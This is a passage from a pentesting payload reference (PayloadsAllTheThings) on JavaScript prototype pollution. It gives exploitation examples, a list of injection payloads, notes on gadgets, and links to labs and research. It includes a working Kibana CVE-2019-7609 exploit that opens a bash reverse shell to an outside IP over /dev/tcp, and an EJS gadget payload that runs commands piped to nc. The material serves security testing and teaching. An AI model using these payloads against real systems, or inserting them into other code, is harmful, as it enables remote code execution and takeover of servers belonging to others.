<!-- source: Prototype Pollution/README.md | chunk 2/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->


### Prototype Pollution Exploitation

Depending if the prototype pollution is executed client (CSPP) or server side (SSPP), the impact will vary.

* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://web.archive.org/web/20191031042307/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

    ```js
    .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
    ```

* Remote Command Execution: [RCE using EJS gadgets](https://web.archive.org/web/20230309172121/https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

    ```js
    {
        "__proto__": {
            "client": 1,
            "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
        }
    }
    ```

* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://web.archive.org/web/20200928082422/https://hackerone.com/reports/986386)
* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* Denial of Service

### Prototype Pollution Payloads

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

### Prototype Pollution Gadgets

A "gadget" in the context of vulnerabilities typically refers to a piece of code or functionality that can be exploited or leveraged during an attack. When we talk about a "prototype pollution gadget," we're referring to a specific code path, function, or feature of an application that is susceptible to or can be exploited through a prototype pollution attack.

Either create your own gadget using part of the source with [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder), or try to use already discovered gadgets [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) / [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).

## Labs

* [YesWeHack Dojo - Prototype Pollution](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)
* [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)

## References

* [A Pentester's Guide to Prototype Pollution Attacks - Harsh Bothra - January 2, 2023](https://web.archive.org/web/20260111201021/https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
* [A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild - s1r1us - September 28, 2021](https://web.archive.org/web/20260204200448/https://blog.s1r1us.ninja/research/PP)
* [Detecting Server-Side Prototype Pollution - Daniel Thatcher - February 15, 2023](https://web.archive.org/web/20230221012320/https://www.intruder.io/research/server-side-prototype-pollution)
* [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) - Michał Bentkowski - October 30, 2019](https://web.archive.org/web/20250810040511/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [Keynote | Server Side Prototype Pollution: Blackbox Detection Without The DoS - Gareth Heyes - March 27, 2023](https://web.archive.org/web/20230327103116/https://youtu.be/LD-KcuKM_0M)
* [NodeJS - \_\_proto\_\_ & prototype Pollution - HackTricks - July 19, 2024](https://web.archive.org/web/20241224163723/https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
* [Prototype Pollution - PortSwigger - November 10, 2022](https://web.archive.org/web/20221110144930/https://portswigger.net/web-security/prototype-pollution)
* [Prototype pollution - Snyk - August 19, 2023](https://web.archive.org/web/20211010192146/https://learn.snyk.io/lessons/prototype-pollution/javascript/)
* [Prototype pollution and bypassing client-side HTML sanitizers - Michał Bentkowski - August 18, 2020](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* [Prototype Pollution and Where to Find Them - BitK & SakiiR - August 14, 2023](https://youtu.be/mwpH9DF_RDA)
* [Prototype Pollution Attacks in NodeJS - Olivier Arteau - May 16, 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
* [Prototype Pollution Attacks in NodeJS applications - Olivier Arteau - October 3, 2018](https://web.archive.org/web/20190218093454/https://youtu.be/LUsiFV3dsK8)
* [Prototype Pollution Leads to RCE: Gadgets Everywhere - Mikhail Shcherbakov - September 29, 2023](https://web.archive.org/web/20240416043553/https://youtu.be/v5dq80S1WF4)
* [Server side prototype pollution, how to detect and exploit - BitK - February 18, 2023](http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
* [Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes - February 15, 2023](https://web.archive.org/web/20260219234352/https://portswigger.net/research/server-side-prototype-pollution)
